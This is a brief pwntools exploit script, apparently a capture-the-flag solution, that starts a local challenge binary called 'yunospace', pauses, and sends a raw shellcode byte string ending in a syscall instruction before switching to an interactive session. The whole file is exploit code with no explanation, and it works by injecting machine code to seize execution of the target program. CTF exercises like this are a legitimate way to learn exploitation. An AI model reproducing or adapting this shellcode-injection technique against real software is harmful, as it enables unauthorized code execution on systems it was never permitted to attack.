from pwn import *

r = process(['./yunospace', 'a'])

# r.sendlineafter('today?', '0')

pause()

r.sendline('\xe8\xff\xff\xff\xff\xc0\x5e\x0f\x05')

r.interactive()
